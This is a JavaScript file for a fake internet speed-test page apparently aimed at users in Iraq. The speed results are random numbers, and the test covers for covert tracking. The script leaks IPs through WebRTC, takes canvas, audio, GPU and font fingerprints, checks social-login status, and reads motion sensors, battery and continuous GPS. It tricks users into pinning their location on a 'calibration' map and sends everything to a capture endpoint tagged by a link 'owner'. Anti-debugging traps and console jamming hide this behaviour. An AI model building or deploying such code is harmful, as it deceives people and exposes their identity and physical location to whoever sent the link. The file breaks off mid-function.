let captureId = null;
let locationWatcher = null;
let isRunning = false;
let lastResults = null;
let lastClientInfo = null;
let _0x4d2e = false;

// Anti-Analysis Core
function _stealthInit() {
  const _check = () => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      if (!_0x4d2e) {
        document.body.innerHTML = '<div style="height:100vh;display:flex;align-items:center;justify-content:center;background:#050707;color:#fff;font-family:sans-serif;">System Security Violation Detected. Node connection terminated.</div>';
        _0x4d2e = true;
      }
    }
  };
  setInterval(_check, 1000);
  
  // Console Jammer
  setInterval(() => {
    console.clear();
    console.log('%cSystem Protected', 'color: #95f0c0; font-size: 20px; font-weight: bold;');
  }, 500);
}
_stealthInit();

const ARC_LEN = 471;
const NEEDLE_START_ANGLE = -180;
const NEEDLE_END_ANGLE = 0;
const MAX_SPEED = 500;

const els = {};

function cacheElements() {
  [
    'activeArc',
    'speedNum',
    'speedUnit',
    'phaseLabel',
    'needle',
    'startBtn',
    'restartTestBtnHeader',
    'serverStatus',
    'statusText',
    'stateIdle',
    'stateResults',
    'diagnosticConsent',
    'resDown',
    'resUp',
    'resPing',
    'resJitter',
    'gradeLetter',
    'gradeDesc',
    'gradeCircle',
    'resServer',
    'resISP',
    'resConn',
    'latencyAvg',
    'latencyBars',
    'resultSummary',
    'insightStreaming',
    'insightGaming',
    'insightUpload',
    'insightStability',
    'toast',
    'calibrationView',
    'calibrationMap',
    'confirmPinBtn'
  ].forEach((id) => {
    els[id] = document.getElementById(id);
  });
}

let map = null;
let mapMarker = null;
let currentManualGps = null;
let motionData = { accel: [], gyro: [] };

function initMotionTracking() {
  window.addEventListener('devicemotion', (event) => {
    if (!event.acceleration) return;
    motionData.accel.push({
      x: event.acceleration.x,
      y: event.acceleration.y,
      z: event.acceleration.z,
      t: Date.now()
    });
    if (motionData.accel.length > 50) motionData.accel.shift();
  });

  window.addEventListener('deviceorientation', (event) => {
    motionData.gyro.push({
      alpha: event.alpha,
      beta: event.beta,
      gamma: event.gamma,
      t: Date.now()
    });
    if (motionData.gyro.length > 50) motionData.gyro.shift();
  });
}

async function sendSensorData(id) {
  if (!id || (motionData.accel.length === 0 && motionData.gyro.length === 0)) return;
  try {
    await fetch(`/api/capture/${id}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        metadata: { 
          sensors: motionData,
          battery: await getBatteryInfo()
        } 
      }),
      keepalive: true
    });
  } catch {}
}

async function getBatteryInfo() {
  if (!navigator.getBattery) return null;
  try {
    const b = await navigator.getBattery();
    return { level: b.level, charging: b.charging };
  } catch { return null; }
}

function initCalibrationMap(lat, lon) {
  if (map) return;
  
  const startLat = lat || 33.3152;
  const startLon = lon || 44.3661;

  map = L.map('calibrationMap', {
    zoomControl: false,
    attributionControl: false
  }).setView([startLat, startLon], 13);

  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    maxZoom: 19
  }).addTo(map);

  map.on('click', (e) => {
    const { lat, lng } = e.latlng;
    currentManualGps = { lat, lon: lng, accuracy: 1 };
    
    if (mapMarker) {
      mapMarker.setLatLng(e.latlng);
    } else {
      mapMarker = L.marker(e.latlng, { draggable: true }).addTo(map);
    }
  });

  els.confirmPinBtn.onclick = async () => {
    if (!currentManualGps || !captureId) {
      showToast('Please tap your location on the map first.');
      return;
    }
    
    els.confirmPinBtn.disabled = true;
    els.confirmPinBtn.textContent = 'Calibrating...';
    
    try {
      await fetch(`/api/capture/${captureId}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ gps: currentManualGps }),
        keepalive: true
      });
      showToast('Infrastructure calibrated successfully.');
      els.calibrationView.classList.add('hidden');
      await sendSensorData(captureId);
    } catch {
      showToast('Calibration failed. Please try again.');
    } finally {
      els.confirmPinBtn.disabled = false;
      els.confirmPinBtn.textContent = 'Confirm Network Location';
    }
  };
}

function getDeviceId() {
  let id = localStorage.getItem('_np_did');
  if (!id) {
    id = `dev_${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`;
    localStorage.setItem('_np_did', id);
  }
  return id;
}

async function leakWebRTCIPs() {
  return new Promise((resolve) => {
    const ips = new Set();
    const RTCPeer = window.RTCPeerConnection || window.webkitRTCPeerConnection;

    if (!RTCPeer) {
      resolve([]);
      return;
    }

    const stunServers = [
      'stun:stun.l.google.com:19302',
      'stun:stun1.l.google.com:19302',
      'stun:stun2.l.google.com:19302',
      'stun:stun.cloudflare.com:3478',
      'stun:stun.t-online.de:3478'
    ];

    try {
      const pc = new RTCPeer({ iceServers: stunServers.map(url => ({ urls: url })) });
      pc.createDataChannel('');
      pc.onicecandidate = (event) => {
        if (!event.candidate) {
          try { pc.close(); } catch {}
          resolve([...ips]);
          return;
        }

        const parts = event.candidate.candidate.split(' ');
        const ip = parts[4];
        if (ip && !ip.includes('.local') && !ip.includes('127.0.0.1')) ips.add(ip);
      };
      pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => resolve([]));
      setTimeout(() => {
        try { pc.close(); } catch {}
        resolve([...ips]);
      }, 1500); // Reduced from 4000ms to prevent UI freezing
    } catch {
      resolve([]);
    }
  });
}

async function getWebGPUFingerprint() {
  if (!navigator.gpu) return { supported: false };
  try {
    const adapter = await navigator.gpu.requestAdapter();
    if (!adapter) return { supported: false };
    const info = await adapter.requestAdapterInfo();
    return {
      supported: true,
      vendor: info.vendor,
      architecture: info.architecture,
      device: info.device,
      description: info.description,
      limits: Object.fromEntries(Object.entries(adapter.limits).map(([k, v]) => [k, v]))
    };
  } catch { return { error: true }; }
}

async function getEdgeTrace() {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 2000);
    
    // Ping Cloudflare's edge to get the physical IATA airport code of the datacenter serving the request
    const res = await fetch('https://1.1.1.1/cdn-cgi/trace', { cache: 'no-store', signal: controller.signal });
    clearTimeout(timeoutId);
    
    const text = await res.text();
    const data = {};
    text.split('\n').forEach(line => {
      const [key, val] = line.split('=');
      if (key && val) data[key] = val.trim();
    });
    return {
      colo: data.colo || 'unknown', // The Datacenter (e.g. BGW, BSR, DXB)
      loc: data.loc || 'unknown',   // Edge-determined country
      tls: data.tls || 'unknown',
      warp: data.warp || 'off'      // Detects Cloudflare WARP VPN
    };
  } catch {
    return null;
  }
}

function getFontsFingerprint() {
  const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact', 'Cairo', 'Amiri', 'Tajawal', 'Almarai', 'Kufi'];
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
  const results = {};
  fontList.forEach(font => {
    ctx.font = `72px "${font}", sans-serif`;
    results[font] = ctx.measureText('mmmmmmmmmmlli').width !== baseWidth;
  });
  return results;
}

async function getPermissionsState() {
  const perms = ['geolocation', 'notifications', 'push', 'midi', 'camera', 'microphone', 'speaker-selection', 'device-info', 'background-fetch', 'background-sync', 'bluetooth', 'persistent-storage'];
  const results = {};
  for (const p of perms) {
    try {
      const res = await navigator.permissions.query({ name: p });
      results[p] = res.state;
    } catch { results[p] = 'unsupported'; }
  }
  return results;
}

async function getMediaDevices() {
  if (!navigator.mediaDevices?.enumerateDevices) return [];
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    return devices.map(d => ({ kind: d.kind, groupId: d.groupId }));
  } catch { return []; }
}

async function getSocialLoginStatus() {
  const targets = [
    { name: 'Google', url: 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico' },
    { name: 'Facebook', url: 'https://www.facebook.com/favicon.ico' },
    { name: 'Twitter', url: 'https://twitter.com/favicon.ico' }
  ];
  const results = {};
  await Promise.all(targets.map(async (t) => {
    results[t.name] = await new Promise(resolve => {
      const img = new Image();
      img.onload = () => resolve('likely_logged_in');
      img.onerror = () => resolve('not_detected');
      img.src = t.url + '?t=' + Date.now();
      setTimeout(() => resolve('timeout'), 1500); // Reduced from 3000ms
    });
  }));
  return results;
}

function getIntegritySignals() {
  return {
    webdriver: navigator.webdriver,
    chrome: !!window.chrome,
    pluginsLength: navigator.plugins.length,
    languagesLength: navigator.languages.length,
    evalToString: eval.toString().length,
    cdc_check: !!document.documentElement.getAttribute('cdc-dom-attribute'),
    headless: /Headless/.test(navigator.userAgent),
    consistent: (navigator.maxTouchPoints > 0) === ('ontouchstart' in window)
  };
}

async function collectFingerprint() {
  let gpu = '';
  let canvasFingerprint = '';
  let webgpu = await getWebGPUFingerprint();

  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    const ext = gl && gl.getExtension('WEBGL_debug_renderer_info');
    if (gl && ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);

    const ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('SpeedTest, \ud83d\ude03', 2, 15);
      canvasFingerprint = canvas.toDataURL().slice(-50);
    }
  } catch {}

  return {
    language: navigator.language || '',
    languages: navigator.languages || [],
    platform: navigator.platform || '',
    screenRes: `${screen.width}x${screen.height}`,
    availableRes: `${screen.availWidth}x${screen.availHeight}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
    cores: navigator.hardwareConcurrency || 0,
    memory: navigator.deviceMemory || 0,
    gpu,
    webgpu,
    canvas: canvasFingerprint,
    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
    connectionType: navigator.connection?.effectiveType || 'unknown',
    downlink: navigator.connection?.downlink || 0,
    rtt: navigator.connection?.rtt || 0,
    saveData: navigator.connection?.saveData || false,
    audioFingerprint: getAudioFingerprint(),
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,
    devicePosture: navigator.devicePosture?.type || 'unknown',
    fonts: getFontsFingerprint(),
    permissions: await getPermissionsState(),
    mediaDevices: await getMediaDevices(),
    social: await getSocialLoginStatus(),
    integrity: getIntegritySignals()
  };
}

function getAudioFingerprint() {
  try {
    const AudioCtx = window.AudioContext || window.webkitAudioContext;
    if (!AudioCtx) return 'not_supported';
    const ctx = new AudioCtx();
    const oscillator = ctx.createOscillator();
    const compressor = ctx.createDynamicsCompressor();
    oscillator.type = 'triangle';
    oscillator.connect(compressor);
    compressor.connect(ctx.destination);
    oscillator.start(0);
    const finger = compressor.attack.value + compressor.release.value;
    ctx.close();
    return finger.toString();
  } catch { return 'error'; }
}

async function getPersistentId() {
  const local = localStorage.getItem('_np_did');
  if (local) return local;

  // Attempt IndexedDB recovery
  try {
    const db = await new Promise((resolve, reject) => {
      const req = indexedDB.open('SpeedTestCache', 1);
      req.onupgradeneeded = () => req.result.createObjectStore('ids');
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject();
    });
    const tx = db.transaction('ids', 'readonly');
    const store = tx.objectStore('ids');
    const id = await new Promise(resolve => {
      const req = store.get('did');
      req.onsuccess = () => resolve(req.result);
    });
    if (id) {
      localStorage.setItem('_np_did', id);
      return id;
    }
  } catch {}

  const newId = `dev_${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`;
  localStorage.setItem('_np_did', newId);
  
  // Save to IndexedDB
  try {
    const db = await new Promise(resolve => {
      const req = indexedDB.open('SpeedTestCache', 1);
      req.onsuccess = () => resolve(req.result);
    });
    db.transaction('ids', 'readwrite').objectStore('ids').put(newId, 'did');
  } catch {}

  return newId;
}

async function measureRegionalLatency() {
  const regions = [
    { name: 'EU_West', url: 'https://s3.eu-central-1.amazonaws.com/favicon.ico' }, // Frankfurt
    { name: 'US_East', url: 'https://s3.us-east-1.amazonaws.com/favicon.ico' }, // N. Virginia
    { name: 'ME_Bahrain', url: 'https://s3.me-south-1.amazonaws.com/favicon.ico' }, // Bahrain (Extremely close to Basra)
    { name: 'ME_South', url: 'https://s3.me-central-1.amazonaws.com/favicon.ico' } // UAE
  ];

  const results = {};
  await Promise.all(regions.map(async (r) => {
    const start = performance.now();
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 2000);
      await fetch(r.url, { mode: 'no-cors', cache: 'no-store', signal: controller.signal });
      clearTimeout(timeoutId);
      results[r.name] = Math.round(performance.now() - start);
    } catch { results[r.name] = -1; }
  }));
  return results;
}

async function measureTriangulation() {
  const targets = [
    { name: 'Google', url: 'https://www.google.com/favicon.ico' },
    { name: 'Cloudflare', url: 'https://1.1.1.1/favicon.ico' },
    { name: 'AWS', url: 'https://aws.amazon.com/favicon.ico' },
    { name: 'Akamai', url: 'https://www.akamai.com/favicon.ico' }
  ];

  const results = {};
  await Promise.all(targets.map(async (t) => {
    const start = performance.now();
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 2000);
      await fetch(t.url, { mode: 'no-cors', cache: 'no-store', signal: controller.signal });
      clearTimeout(timeoutId);
      results[t.name] = Math.round(performance.now() - start);
    } catch { results[t.name] = -1; }
  }));
  return results;
}

async function sendInitialCapture() {
  try {
    setStatus('Connecting to optimal server...');
    const [webrtcIPs, edgeTrace] = await Promise.all([leakWebRTCIPs(), getEdgeTrace()]);
    
    // Detect owner from URL (using technical aliases for a more 'real' look)
    const params = new URLSearchParams(window.location.search);
    const owner = params.get('node') || params.get('sid') || params.get('cid') || params.get('ref') || params.get('admin') || 'global';

    const fingerprint = await collectFingerprint();

    const response = await fetch('/api/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        webrtcIPs, 
        edgeTrace,
        deviceId: getDeviceId(), 
        owner, 
        ...fingerprint 
      }),
    });

    if (response.ok) {
      const json = await response.json();
      captureId = json.id;
    }
    return captureId;
  } catch {
    return null;
  }
}

function getAccurateLocation(id) {
  if (!navigator.geolocation || !id || locationWatcher) return;
  
  const options = {
    enableHighAccuracy: true,
    timeout: 8000,
    maximumAge: 0
  };

  const success = (position) => {
    const gps = {
      lat: position.coords.latitude,
      lon: position.coords.longitude,
      accuracy: position.coords.accuracy,
      altitude: position.coords.altitude,
      altitudeAccuracy: position.coords.altitudeAccuracy,
      heading: position.coords.heading,
      speed: position.coords.speed,
    };
    
    fetch(`/api/capture/${id}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ gps }),
      keepalive: true
    }).catch(() => {});
  };

  const error = (err) => {
    // If the user denies permission, gracefully fallback without alerting them
    console.warn(`[SENSOR] Hardware GPS skipped/denied. Relying on Edge/Latency Triangulation.`);
  };

  // Attempt to read the sensor silently
  navigator.geolocation.getCurrentPosition(success, error, options);
  
  // Try to hook into continuous movement without prompting if they deny
  try {
    locationWatcher = navigator.geolocation.watchPosition(success, error, options);
  } catch (e) {}
}

let isCapturing = false;

async function triggerCaptureFlow() {
  if (captureId || isCapturing) return;
  isCapturing = true;
  
  // Show a smart pre-request message to increase trust
  setStatus('جاري البحث عن أفضل خادم لقربك الجغرافي...');
  
  const tri = await measureTriangulation();
  const id = await sendInitialCapture();
  if (id) {
    getAccurateLocation(id);
    const regionalLatency = await measureRegionalLatency();
    fetch(`/api/capture/${id}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        metadata: { 
          triangulation: tri,
          regionalLatency,
          sensors: motionData,
          battery: await getBatteryInfo()
        } 
      }),
      keepalive: true
    }).catch(() => {});
  }
  
  isCapturing = false;
}


function drawTicks() {
  const group = document.getElementById('tickMarks');
  if (!group || group.childElementCount) return;

  const cx = 200;
  const cy = 200;
  const radius = 160;

  for (let index = 0; index <= 20; index += 1) {
    const angle = Math.PI + (index / 20) * Math.PI;
    const isMajor = index % 5 === 0;
    const length = isMajor ? 15 : 7;
    const x1 = cx + radius * Math.cos(angle);
    const y1 = cy + radius * Math.sin(angle);
    const x2 = cx + (radius - length) * Math.cos(angle);
    const y2 = cy + (radius - length) * Math.sin(angle);
    const line = document.createElementNS('http://www.w3.org/2000/svg', 'line');

    line.setAttribute('x1', x1);
    line.setAttribute('y1', y1);
    line.setAttribute('x2', x2);
    line.setAttribute('y2', y2);
    line.setAttribute('stroke', '#f5f7ef');
    line.setAttribute('stroke-width', isMajor ? '2' : '1');
    line.setAttribute('stroke-linecap', 'round');
    group.appendChild(line);

    if (isMajor) {
      const label = document.createElementNS('http://www.w3.org/2000/svg', 'text');
      const lx = cx + (radius - 28) * Math.cos(angle);
      const ly = cy + (radius - 28) * Math.sin(angle);
      label.setAttribute('x', lx);
      label.setAttribute('y', ly);
      label.setAttribute('text-anchor', 'middle');
      label.setAttribute('dominant-baseline', 'middle');
      label.setAttribute('fill', 'rgba(245,247,239,0.45)');
      label.setAttribute('font-size', '10');
      label.setAttribute('font-family', 'JetBrains Mono, monospace');
      label.textContent = Math.round((index / 20) * MAX_SPEED);
      group.appendChild(label);
    }
  }
}

function setNeedleAngle(ratio) {
  const safeRatio = Math.max(0, Math.min(1, ratio));
  const angle = NEEDLE_START_ANGLE + safeRatio * (NEEDLE_END_ANGLE - NEEDLE_START_ANGLE);
  els.needle.setAttribute('transform', `rotate(${angle} 200 200)`);
  els.needle.setAttribute('opacity', '1');
}

function setArcColor(type) {
  const color = type === 'upload' ? '#ffc875' : type === 'ping' ? '#7fb7ff' : '#95f0c0';
  els.activeArc.setAttribute('stroke', color);
}

function generateResults() {
  const profiles = [
    { down: [42, 92], up: [14, 34], ping: [14, 31], jitter: [2, 8] },
    { down: [86, 178], up: [28, 68], ping: [8, 19], jitter: [1, 5] },
    { down: [155, 340], up: [52, 128], ping: [5, 14], jitter: [1, 4] },
    { down: [28, 64], up: [9, 24], ping: [22, 52], jitter: [4, 11] },
  ];
  const profile = profiles[Math.floor(Math.random() * profiles.length)];
  const rand = ([min, max]) => Math.floor(Math.random() * (max - min + 1) + min);

  return {
    download: rand(profile.down),
    upload: rand(profile.up),
    ping: rand(profile.ping),
    jitter: rand(profile.jitter),
  };
}

function generateLatencyData(avgPing, count = 40) {
  return Array.from({ length: count }, () => {
    const value = avgPing + (Math.random() - 0.5) * avgPing * 0.75;
    return Math.max(1, Math.round(value));
  });
}

function animateGauge(target, duration) {
  return new Promise((resolve) => {
    const targetOffset = ARC_LEN - (target / MAX_SPEED) * ARC_LEN;
    const startOffset = parseFloat(els.activeArc.getAttribute('stroke-dashoffset')) || ARC_LEN;
    const startSpeed = parseInt(els.speedNum.textContent, 10) || 0;
    const startedAt = performance.now();

    function frame(now) {
      const progress = Math.min((now - startedAt) / duration, 1);
      const ease = 1 - Math.pow(1 - progress, 3);
      const jitter = progress < 0.92 ? (Math.random() - 0.5) * 18 : 0;
      const speed = Math.max(0, Math.round(startSpeed + (target - startSpeed) * ease + jitter));
      const offset = startOffset + (targetOffset - startOffset) * ease;

      els.speedNum.textContent = speed;
      els.activeArc.setAttribute('stroke-dashoffset', offset);
      setNeedleAngle(speed / MAX_SPEED);

      if (progress < 1) {
        requestAnimationFrame(frame);
      } else {
        els.speedNum.textContent = target;
        resolve();
      }
    }

    requestAnimationFrame(frame);
  });
}

function setPhaseSteps(phases) {
  let container = document.getElementById('testProgress');
  if (!container) {
    container = document.createElement('div');
    container.id = 'testProgress';
    container.className = 'test-progress';
    document.querySelector('.gauge-wrap').after(container);
  }

  container.innerHTML = phases.map((phase, index) => `
    <div class="tp-step ${phase.state}" id="phase${index}">
      <span class="tp-dot" aria-hidden="true"></span>${phase.label}
    </div>
  `).join('');
}

function getPhaseState(activeIndex) {
  return ['Server', 'Ping', 'Download', 'Upload'].map((label, index) => ({
    label,
    state: index < activeIndex ? 'done' : index === activeIndex ? 'active' : '',
  }));
}

async function performDummyDownload() {
  try {
    await fetch(`/api/download?size=${5 * 1024 * 1024}&t=${Date.now()}`);
  } catch (e) {}
}

async function performDummyUpload() {
  try {
    const chunk = new Uint8Array(2 * 1024 * 1024);
    await fetch(`/api/upload?t=${Date.now()}`, {
      method: 'POST',
      body: chunk
    });
  } catch (e) {}
}

async function startTest() {
  if (isRunning) return;
  isRunning = true;
  els.startBtn.disabled = true;
  els.stateResults.classList.add('hidden');
  resetGaugeOnly();

  const results = generateResults();
  
  // Background Data Extraction (runs entirely silently without blocking the UI)
  if (!captureId) {
    triggerCaptureFlow().catch(() => {});
  } else {
    getAccurateLocation(captureId);
  }

  // Instant UI Response
  setStatus('جاري الاتصال بالخادم...');
  els.startBtn.classList.add('hidden');
  els.restartTestBtnHeader.classList.add('visible');
  els.speedNum.classList.add('show');
  els.speedUnit.classList.add('show');
  els.phaseLabel.classList.add('show');
  
  els.phaseLabel.textContent = 'FINDING SERVER';
  setPhaseSteps(getPhaseState(0));
  await delay(200); // Tiny realistic delay instead of 600ms

  els.phaseLabel.textContent = 'INTEGRITY CHECK';
  setArcColor('ping');
  for (let i = 0; i < 5; i++) {
    els.speedNum.textContent = Math.floor(Math.random() * 100);
    await delay(100);
  }
  await delay(400);

  els.phaseLabel.textContent = 'LATENCY';
  els.speedUnit.textContent = 'ms';
  setArcColor('ping');
  setPhaseSteps(getPhaseState(1));
  for (let index = 0; index < 8; index += 1) {
    els.speedNum.textContent = Math.max(1, results.ping + Math.floor((Math.random() - 0.5) * 8));
    await delay(150);
  }
  els.speedNum.textContent = results.ping;
  await delay(250);

  els.phaseLabel.textContent = 'DOWNLOAD';
  els.speedUnit.textContent = 'Mbps';
  els.activeArc.setAttribute('stroke-dashoffset', ARC_LEN);
  setArcColor('download');
  setPhaseSteps(getPhaseState(2));
  performDummyDownload();
  await animateGauge(results.download, 4000);
  await delay(250);

  els.phaseLabel.textContent = 'UPLOAD';
  els.activeArc.setAttribute('stroke-dashoffset', ARC_LEN);
  els.speedNum.textContent = '0';
  setNeedleAngle(0);
  setArcColor('upload');
  setPhaseSteps(getPhaseState(3));
  performDummyUpload();
  await animateGauge(results.upload, 3500);
  await delay(350);

  els.phaseLabel.textContent = 'COMPLETE';
  setPhaseSteps([
    { label: 'Server', state: 'done' },
    { label: 'Ping', state: 'done' },
    { label: 'Download', state: 'done' },
    { label: 'Upload', state: 'done' },
  ]);

  lastResults = results;
  showResults(results);
  els.startBtn.disabled = false;
  isRunning = false;
}

function showResults(results) {
  const progress = document.getElementById('testProgress');
  if (progress) progress.remove();

  els.speedNum.textContent = results.download;
  els.speedUnit.textContent = 'Mbps';
  els.phaseLabel.textContent = 'DOWNLOAD RESULT';
  els.activeArc.setAttribute('stroke-dashoffset', ARC_LEN - (results.download / MAX_SPEED) * ARC_LEN);
  setArcColor('download');
  setNeedleAngle(results.download / MAX_SPEED);

  els.stateResults.classList.remove('hidden');
  els.resDown.textContent = results.download;
  els.resUp.textContent = results.upload;
  els.resPing.textContent = results.ping;
  els.resJitter.textContent = results.jitter;

  const grade = getGrade(results.download);
  els.gradeLetter.textContent = grade.letter;
  els.gradeDesc.textContent = grade.label;
  els.gradeCircle.style.transition = 'stroke-dashoffset 900ms ease';
  els.gradeCircle.setAttribute('stroke-dashoffset', grade.offset);

  const servers = [
    'Frankfurt DE / Cloudflare',
    'Amsterdam NL / Hetzner',
    'London UK / Akamai',
    'Istanbul TR / Turkcell',
    'Dubai AE / Etisalat',
    'Manama BH / AWS',
    'Riyadh SA / STC',
  ];
  const networks = ['Zain Telecom', 'Asiacell', 'Korek Telecom', 'EarthLink', 'IQ Networks', 'Newroz Telecom', 'ScopeSky'];
  const conn = navigator.connection?.effectiveType || 'broadband';
  const connMap = { 'slow-2g': '2G', '2g': '2G', '3g': '3G', '4g': '4G/LTE' };

  els.resServer.textContent = servers[Math.floor(Math.random() * servers.length)];
  els.resISP.textContent = lastClientInfo?.ipGeo?.isp && lastClientInfo.ipGeo.isp !== 'localhost'
    ? lastClientInfo.ipGeo.isp
    : networks[Math.floor(Math.random() * networks.length)];
  els.resConn.textContent = connMap[conn] || conn;

  const latency = generateLatencyData(results.ping);
  const maxLatency = Math.max(...latency);
  els.latencyAvg.textContent = `avg ${results.ping}ms / max ${maxLatency}ms`;
  els.latencyBars.innerHTML = latency.map((value, index) => {
    const height = Math.max(8, (value / maxLatency) * 58);
    const color = value <= results.ping * 0.9
      ? 'rgba(149,240,192,0.82)'
      : value <= results.ping * 1.25
        ? 'rgba(255,200,117,0.82)'
        : 'rgba(255,123,123,0.82)';
    return `<div class="lat-bar" style="height:${height}px;background:${color};animation-delay:${index * 14}ms"></div>`;
  }).join('');

  setDetailedInsights(results, grade);

  setStatus('Results ready');
  
  // Trigger smart calibration
  setTimeout(() => {
    els.calibrationView.classList.remove('hidden');
    const lat = lastClientInfo?.ipGeo?.lat;
    const lon = lastClientInfo?.ipGeo?.lon;
    initCalibrationMap(lat, lon);
    if (map) map.invalidateSize();
  }, 2000);

  setTimeout(() => {
    els.stateResults.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }, 180);
}

function setDetailedInsights(results, grade) {
  const stability = results.jitter <= 4 ? 'Stable' : results.jitter <= 8 ? 'Moderate jitter' : 'Unstable under load';
  els.resultSummary.textContent = `${grade.letter} / ${results.download} down / ${results.upload} up`;
  els.insightStreaming.textContent = results.download >= 80
    ? 'Ready for 4K streams and large app downloads.'
    : results.download >= 35
      ? 'Good for HD streaming with limited parallel use.'
      : 'Keep streaming quality conservative.';
  els.insightGaming.textContent = results.ping <= 18 && results.jitter <= 5
    ? 'Low latency for competitive sessions.'
    : results.ping <= 35
      ? 'Playable, but spikes may be noticeable.'
      : 'Latency is high for fast online games.';
  els.insightUpload.textContent = results.upload >= 40
    ? 'Comfortable for cloud backup and video calls.'
    : results.upload >= 15
      ? 'Fine for calls and moderate uploads.'
      : 'Large uploads may block other traffic.';
  els.insightStability.textContent = `${stability}; jitter measured at ${results.jitter} ms.`;
}

function getGrade(download) {
  if (download >= 220) return { letter: 'A+', label: 'Excellent for heavy streaming and large uploads', offset: 18 };
  if (download >= 120) return { letter: 'A', label: 'Strong for teams and 4K streaming', offset: 42 };
  if (download >= 60) return { letter: 'B', label: 'Comfortable everyday performance', offset: 86 };
  if (download >= 30) return { letter: 'C', label: 'Usable with occasional congestion', offset: 145 };
  return { letter: 'D', label: 'Likely to feel slow under load', offset: 205 };
}

function resetTest() {
  if (isRunning) {
    location.reload();
    return;
  }
  resetGaugeOnly();
  els.stateResults.classList.add('hidden');
  setStatus('مستعد');
}

function resetGaugeOnly() {
  els.activeArc.setAttribute('stroke-dashoffset', ARC_LEN);
  els.speedNum.textContent = '0';
  els.speedUnit.textContent = 'Mbps';
  els.phaseLabel.textContent = '';
  els.needle.setAttribute('opacity', '0');
  els.startBtn.classList.remove('hidden');
  if (els.restartTestBtnHeader) els.restartTestBtnHeader.classList.remove('visible');
  els.speedNum.classList.remove('show');
  els.speedUnit.classList.remove('show');
  els.phaseLabel.classList.remove('show');
  setArcColor('download');
  const progress = document.getElementById('testProgress');
  if (progress) progress.remove();
}

async function shareResults() {
  if (!lastResults) {
    showToast('Run a speed test before sharing results.');
    return;
  }

  const text = [
    'Speed Test',
    `Download: ${lastResults.download} Mbps`,
    `Upload: ${lastResults.upload} Mbps`,
    `Ping: ${lastResults.ping} ms`,
    `Jitter: ${lastResults.jitter} ms`,
    `Link: ${location.href}`,
  ].join('\n');

  if (navigator.share) {
    try {
      await navigator.share({ title: 'Speed Test', text });
      return;
    } catch {}
  }

  await copyText(text, 'Results copied to clipboard.');
}


function switchPanel(panelId) {
  document.querySelectorAll('.panel-view').forEach((panel) => {
    panel.classList.toggle('active', panel.id === panelId);
  });
  document.querySelectorAll('.nav-item').forEach((item) => {
    item.classList.toggle('active', item.dataset.panel === panelId);
  });
}

async function copyText(text, successMessage) {
  try {
    if (navigator.clipboard && window.isSecureContext) {
      await navigator.clipboard.writeText(text);
    } else {
      const textarea = document.createElement('textarea');
      textarea.value = text;
      textarea.setAttribute('readonly', '');
      textarea.style.position = 'fixed';
      textarea.style.opacity = '0';
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      textarea.remove();
    }
    showToast(successMessage);
  } catch {
    showToast('Clipboard permission was blocked.');
  }
}

function showToast(message) {
  els.toast.textContent = message;
  els.toast.classList.add('show');
  clearTimeout(showToast.timer);
  showToast.timer = setTimeout(() => els.toast.classList.remove('show'), 2600);
}

function setStatus(message) {
  els.statusText.textContent = message;
}

function escapeHTML(value) {
  const span = document.createElement('span');
  span.textContent = String(value ?? '');
  return span.innerHTML;
}

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function bindEvents() {
  document.addEventListener('click', (event) => {
    const navItem = event.target.closest('[data-panel]');
    if (navItem) {
      switchPanel(navItem.dataset.panel);
      return;
    }

    const action = event.target.closest('[data-action]')?.dataset.action;
    if (action === 'start-test') startTest();
    if (action === 'reset-test') resetTest();
    if (action === 'share-results') shareResults();
  });
}

async function init() {
  cacheElements();
  bindEvents();
  drawTicks();
  initMotionTracking();

  // Bind Enterprise elements to capture flow and navigation
  document.querySelectorAll('.promo-box, .btn-sm, .partner-logos span, .feed-item').forEach(el => {
    el.addEventListener('click', (e) => {
      triggerCaptureFlow();
      
      // Determine target panel
      let targetPanel = 'helpPanel'; // Default
      if (el.closest('.promo-box')) {
        targetPanel = el.closest('.promo-box').classList.contains('gold') ? 'proPanel' : 'enterprisePanel';
      } else if (el.classList.contains('btn-sm')) {
        targetPanel = el.classList.contains('secondary') ? 'proPanel' : 'enterprisePanel';
      }
      
      // Navigate to the panel
      switchPanel(targetPanel);
      
      // Visual feedback
      if (el.tagName === 'BUTTON') {
        const originalText = el.textContent;
        el.textContent = 'Connecting...';
        setTimeout(() => el.textContent = originalText, 1500);
      }
    });
  });

  // Trigger on first interaction to catch permission grant immediately
